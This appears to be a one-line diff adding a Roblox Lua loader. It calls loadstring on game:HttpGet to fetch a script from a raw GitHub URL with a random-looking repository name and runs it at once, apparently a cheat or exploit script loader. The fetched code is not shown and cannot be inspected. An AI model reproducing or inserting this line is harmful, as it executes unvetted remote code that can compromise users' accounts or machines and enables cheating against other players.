@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LHking123456/uc8xdjm9fhg275r/main/Van"))()
